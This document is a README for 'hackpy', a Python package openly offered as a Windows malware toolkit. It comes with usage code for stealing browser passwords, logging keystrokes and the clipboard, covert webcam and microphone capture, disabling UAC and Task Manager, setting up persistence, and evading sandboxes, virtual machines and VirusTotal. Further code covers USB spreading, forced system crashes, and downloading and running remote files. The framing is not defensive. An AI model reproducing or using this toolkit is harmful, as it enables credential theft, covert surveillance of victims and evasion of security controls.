![Python](https://www.python.org/static/img/python-logo@2x.png)
# `pip install hackpy`  :bomb:

# HackPy 0.1.7 / BETA!!!

## [Donate](https://www.donationalerts.com/r/limerboy)

`Warning! This module created only for Windows systems!`

# Start:
``` python
# 
# Import module
import hackpy

# Selected files will be downloaded to your computer automatically when function 'load_modules(..)' is launched.
# They are necessary for some functions to work.
# To download them, you need an Internet connection when you first import the module on a computer
hackpy.load_modules(
    'autorun.exe',      # Size: 13.5 KB | Need for hackpy.autorun(file).installRegistry(), hackpy.autorun(file).uninstallRegistry(), hackpy.autorun(file).installTaskscheduler(), hackpy.autorun(file).uninstallTaskscheduler()
    'webcam.exe',       # Size: 71.0 KB | Need for hackpy.webcamScreenshot(filename = 'screenshot.png', delay = 4500, camera = 1)
    'nircmd.exe',       # Size: 51.0 KB | Need for hackpy.desktopScreenshot(), hackpy.command.nircmdc()
    'activity.exe',     # Size: 14.0 KB | Need for hackpy.getActiveWindow(), hackpy.userIsActive(), hackpy.setCursorPos(x,y), hackpy.getCursorPos()
    'audio.zip',        # Size: 297  KB | Need for hackpy.recordAudio(filename = 'recording.wav', time = 20)
    'bsod.exe',         # Size: 11.0 KB | Need for hackpy.bsod()
    'rotate_screen.exe',# Size: 16.0 KB | Need for hackpy.rotateScreen()
    'uac.exe',          # Size: 12.0 KB | Need for hackpy.uac.disable(), hackpy.uac.enable(), hackpy.uac.status()
    'watchdog.exe',     # Size: 12.5 KB | Need for hackpy.watchdog('firefox.exe').start()
    'system_status.exe' # Size: 16.0 KB | Need for hackpy.inSandBox(), hackpy.inVirtualBox(), hackpy.cpuName(), hackpy.cpuUsage(), hackpy.gpuName(), hackpy.totalMemory()
)
```

# Get user and system information
![SystemInfo](https://i.ibb.co/MBXpFhj/hackpy-User-Info.png)
``` python
print(
    '\nWelcome to HackPy 0.1.7\n'               +
    '\nUsername: '     + hackpy.userInfo()      +
    '\nVersion: '      + hackpy.versionInfo()   +
    '\nRelease: '      + hackpy.releaseInfo()   +
    '\nSystem: '       + hackpy.systemInfo()    +
    '\nNode: '         + hackpy.nodeInfo()      +
    '\nMachine: '      + hackpy.machineInfo()   +
    '\nProcessor: '    + hackpy.processorInfo() +
    '\nPlatform: '     + hackpy.platformInfo()  +
    '\nArchitecture: ' + hackpy.architecture()
    )
```

# Webcam screenshot
``` python
hackpy.webcamScreenshot(filename = 'screenshot.png', delay = 4500, camera = 1)
```

# Desktop screenshot
``` python
hackpy.desktopScreenshot(filename = 'desktop.png')
```

# Record audio from microphone
``` python
# Save audio record to file recording.wav, 20 secounds
hackpy.recordAudio(filename = 'recording.wav', time = 20)
```

# Passwords recovery
![SITE](https://i.ibb.co/rcr3ZLJ/hackpy-Stealler-Module.png)  
Get passwords from Chrome, Opera, Chromium, Amigo, Atom, Vivaldo, Orbitum, Kometa, Comodo, 360Browser, K-Melon, Maxthon3, Nichrome, CocCoc, Uran, Chromodo browsers..  
``` python
from hackpy.passwords import *

for key, account in passwordsRecovery():
    print(
        '\n['  + str(key) + ']'
        '\n |____ SITE: ' + account['url'] + 
        '\n |____ USER: ' + account['login'] + 
        '\n |____ PASS: ' + account['password']
        )
```

# TaskManager
``` python
# If process iexplore.exe found:
if hackpy.taskmanager('iexplore.exe').find():
    # Stop iexplore.exe process
    hackpy.taskmanager('iexplore.exe').kill() 
    # start firefox.exe process
    hackpy.taskmanager('firefox.exe').start()
    
# Return dictonary with all processes
for process in hackpy.taskmanager.list(): 
    print(process)

# Get PID of process
pid = hackpy.taskmanager.getpid('firefox.exe')
# Disable windows taskmgr.exe
hackpy.taskmanager.disable()
# Enable windows taskmgr.exe
hackpy.taskmanager.enable()
```

# UAC
``` python
# Uac status
hackpy.uac.status()  # "enabled" or "disabled" # Need admin rights

# Disable UAC
hackpy.uac.disable() # Need admin rights
# Enable UAC
hackpy.uac.enable()  # Need admin rights
```

# Autorun
``` python
# Add cmd.exe to startup      | Method with Registry.
hackpy.autorun('C:\\Windows\\System32\\cmd.exe').installRegistry() # Program will be started as User.

# Remove cmd.exe from startup | Method with Registry.
hackpy.autorun('C:\\Windows\\System32\\cmd.exe').uninstallRegistry()


# Add cmd.exe to startup      | Method with TaskScheduler. # Need Admin Rights
hackpy.autorun('C:\\Windows\\System32\\cmd.exe').installTaskscheduler() # Program will be started as Admin.

# Remove cmd.exe from startup | Method with TaskScheduler. # Need Admin Rights
hackpy.autorun('C:\\Windows\\System32\\cmd.exe').uninstallTaskscheduler()

```


# WatchDog
``` python
# Restart explorer.exe when it stopped.
# WARNING ONLY WORKING WITH EXECUTABLE FILES
watchdog = hackpy.watchdog('explorer.exe')
# Start watchdog
watchdog.start()
# .
# .
# .
# Stop watchdog
watchdog.stop()
```

# Anti SandBox and anti VirtualBox
``` python
if hackpy.inSandBox() or hackpy.inVirtualBox(): # If program started in SandBox or VirtualBox
	print('Detected emulator. Stopping!') 
	exit() # Exit
```


# Key Logger
``` python
# Log all pressed keys. Format: (DATE) - [PROGRAM TITLE] - "keys"
from hackpy.keyboard import *

keylogger = Keylogger(filename = 'keylogs.txt')
# Start logger
keylogger.start()
# .
# .
# .
# Stop logger
keylogger.stop()
# Show logger logs
for line in keylogger.getLogs():
    print(line)
# Delete logs file
keylogger.cleanLogs()
```

# Clipboard Logger
``` python
# Log all clipboard changes. Format: (DATE) - [PROGRAM TITLE] - "Clipboard text"
cliplogger = hackpy.clipboard.Clipboardlogger('clipboardlogger.txt')
# Start logger
cliplogger.start()
# .
# .
# .
# Stop logger
cliplogger.stop()
# Show logs
for line in cliplogger.getLogs():
    print(line)
# Delete logs file
cliplogger.cleanLogs()
```

# Program Activity Logger
``` python
# Log all opened program titles. Format: (DATE) - "Program title"
activitylogger = ProgramActivitylogger('programActivityLogger.txt')
# Start logger
activitylogger.start()
# .
# .
# .
# Stop logger
activitylogger.stop()
# Show logs
for line in activitylogger.getLogs():
    print(line)
# Delete logs file
activitylogger.cleanLogs()
```

# Check if program running as admin
``` python
if (hackpy.isAdmin()): # return True if program started as admin
    print('Program started as admin! Loading cmd.exe')
    status = hackpy.file.startAsAdmin('cmd.exe') # return true in [0] if all is okay and message in [1]
    print('Okay, debugMessage:', status[1])
else:
    print('Program started as user!')
```

# BSoD | Crash system
``` python

# BsoD
hackpy.bsod()

# Make some lags
hackpy.logicBomb()
```

# Simple file control
``` python
filemanager = hackpy.file

filemanager.getsize('file.txt')               # Return file size in bytes
filemanager.exists('file.txt')                # Return True or False
filemanager.remove('file.txt')                # Remove file
filemanager.rmtree('dir1\\dir2\\dir3')        # Remove dirs
filemanager.rename('file.txt', 'newfile.txt') # Rename file
filemanager.copy('file.txt', 'C:\\Windows')   # Copy file
filemanager.scan('C:\\')                      # Return all files in directory
filemanager.start('file.txt')                 # Start file 
filemanager.startAsAdmin('file.txt')          # Start file as admin
filemanager.atributeHidden('file.txt')        # Hide file
filemanager.atributeNormal('file.txt')        # Show file

 # Get files tree. (You can use tree('.') to get files tree in current directory)
for file in filemanager.tree('C:\\'):
    print(file)
```

# Detect installed antivirus software on computer:
``` python 
data = hackpy.detectProtection()
for antivirus in data:
    print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])
```

# Check organization
``` python
if hackpy.checkOrganization():
    print('Trojan started on VirusTotal machine! Stopping..')
    exit()
```

# UsbSpread
``` python
print('Copying file to all drives...')        # Need Admin Rights
success_drives = hackpy.usbSpread('file.txt') # Returns a list of drives to which the file was copied successfully

for drive in success_drives:
    print('Successfully copied to: ' + drive)
```

# Ping
``` python
target = 'google.com'
if hackpy.ping(target):         # return True  if target is online
    print(target + ' is online!') 
else:
    print('Failed to connect!') # return False if target not found
```

# Get ip by url
``` python
target = 'google.com'
ip     = hackpy.getHostByName(target) # return '172.217.16.14'

print('IP: ' + ip)
```

# Port scanner
``` python
target = 'youtube.com'
port   = '80'
if hackpy.portIsOpen(target, port):
    print('Port ' + port + ' is opened!')
else:
    print('Port ' + port + ' is closed!')
```

# Information about you IP:
``` python
data = hackpy.whois()
print('[?] - You IP is: ' + data['query'])
print('[?] - You live in: ' + data['country'] + ', country code: ' + data['countryCode'])
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as", "local"}

# Information about other IP:
data = hackpy.whois('216.58.215.110')
print('[?] - Other Information about IP:\n' + str(data))
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as"}

# Get geodata about you IP:
data = hackpy.geoplugin()
print('[?] - Latitude: ' + data['geoplugin_latitude'])
# Return dict: {"geoplugin_request", "geoplugin_status", "geoplugin_delay", "geoplugin_credit", "geoplugin_city", "geoplugin_region", "geoplugin_regionCode", "geoplugin_regionName", "geoplugin_areaCode", "geoplugin_dmaCode", "geoplugin_countryCode", "geoplugin_countryName", "geoplugin_inEU", "geoplugin_euVATrate", "geoplugin_continentCode", "geoplugin_continentName", "geoplugin_latitude", "geoplugin_longitude", "geoplugin_locationAccuracyRadius", "geoplugin_timezone", "geoplugin_currencyCode", "geoplugin_currencySymbol", "geoplugin_currencySymbol_UTF8", "geoplugin_currencyConverter"}
```

# Get router bssid:
``` python
# Get router BSSID | Work fine with Windows 10! 
bssid_string = hackpy.router() # BETA
# Find LATITUDE and LONGITUDE with router BSSID:
data = hackpy.bssid_locate(bssid_string)
print(
    'RANGE     : ' + str(data['range']) + '\n' +
    'LATITUDE  : ' + str(data['lat'])   + '\n' +
    'LONGITUDE : ' + str(data['lon'])   + '\n'
    )
```

# Windows messagebox:
``` python

# MB_OK
# MB_OK_CANCEL
# MB_ABORTRETRYIGNORE
# MB_YES_NO_CANCEL
# MB_YES_NO
# MB_RETRYCANCEL
# MB_CANCELTRYCONTINUE
# MB_HELP

# ICON_ERROR
# ICON_QUESTION
# ICON_WARNING
# ICON_INFORMATION

# MB_TOPMOST

hackpy.messagebox('text', 'title')
hackpy.messagebox('text', 'title', settings=['ICON_WARNING', 'MB_RETRYCANCEL', 'MB_TOPMOST'])
```

# Change desktop wallpaper:
```python 
image = 'C:\\users\\Admin\\wallpaper.png'
hackpy.setWallpaper(image) # BETA
```

# Commands
![SITE](https://i.ibb.co/znRLN0D/image.png)
``` python
# You can run nircmdc commands in python
# Nircmdc reference: https://nircmd.nirsoft.net
hackpy.command.nircmdc('monitor off')
hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')

# System commands
hackpy.command.system('shutdown -s -t 260')

#Execute powershell command
hackpy.command.powershell('command')
```

# Mouse, Windows control
``` python
# Return active window title
hackpy.getActiveWindow()
# return True if user move mouse. Return False if not
hackpy.userIsActive()   #  BETA!!!
# Set mouse cursor position (x, y)
hackpy.setCursorPos(100, 100) 
# Get mouse corsor position (x, y)
hackpy.getCursorPos() 
```

# Rotate screen
``` python

# Rotate screen
for degrees in (90, 180, 270, 0):
    hackpy.rotateScreen(degrees)

```

# Time
``` python
import hackpy.time as time

# Get first time
firstTime  = time.time()
# Sleep program for 3 secounds
time.sleep(3)
# Get last time
secondTime = time.time()

print('Code executed. Time elapsed: ' + str(round(secondTime - firstTime)) + ' secounds.')

# Get current time
time.date.day() # day, month, year, hour, minute, secound and all.
print('Now ' + time.date.year() + ' year!')
```

# SendKeyPress:
``` python
from hackpy.keyboard import *

keyPress('Hello bro{ENTER}')
# Other keys: https://pastebin.com/Ns3P7UiH
```

# Clipboard
``` python
# Get text from clipboard:
data = hackpy.clipboard.get()
print('Text in clipboard is ' + data)
# Set text to clipboard:
hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')
```

# Download python and install it:
``` python
# Check if python installed on system. False - not installed, True - installed.
if not hackpy.python.check(): 
    print('Python is not installed, trying to install!')
    # Default version is 3.7.0 and install path is C:\python37
    hackpy.python.install('3.6.0', path = 'C:\\python36') 
else:
    print('Python is installed!')
```

# Load and run file from internet
``` python
# Download file
file = hackpy.download(url)
# Start file
hackpy.file.start(file)
```

# System info
``` python
hackpy.cpuName()                # 'Intel(R) Core(TM) i5 CPU    M 560  @ 2.67GHz'
hackpy.cpuUsage()               # 79
hackpy.gpuName()                # 'NVIDIA NVS 3100M'
hackpy.architecture()           # 64
hackpy.getHWID()                # 'BFBBFBFF00120625'
hackpy.totalMemory()            # 6149996
hackpy.freePhysicalMemory()     # 3285036
hackpy.totalVirtualMemory()     # 9164652
hackpy.freeVirtualMemory()      # 4629700

```



# Power
``` python
hackpy.power.reboot()     # Reboot
hackpy.power.shutdown()   # Shutdown
hackpy.power.logoff()     # Logoff
hackpy.power.hibernate()  # Hibernate
```